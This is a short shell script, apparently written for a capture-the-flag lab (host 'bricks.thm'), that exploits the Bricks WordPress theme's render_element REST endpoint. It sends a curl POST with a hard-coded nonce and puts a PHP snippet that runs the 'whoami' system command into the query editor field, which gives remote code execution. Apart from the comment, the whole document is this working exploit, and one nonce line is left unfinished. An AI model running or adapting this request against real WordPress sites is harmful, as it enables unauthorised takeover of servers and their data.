# Script used to be able to run remote code executed in an exploit of Bricks render_elements - Bricks is a theme that can be used in WordPress

HOST=bricks.thm

#NONCE=${curl }

curl -k -X POST https://$HOST/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
  "postId": "1",
  "nonce": "aea121d468",
  "element": {
    "name": "carousel",
    "settings": {
      "type": "posts",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new exception(`whoami`);",
        "objectType": "post"
      }
    }
  }
}'
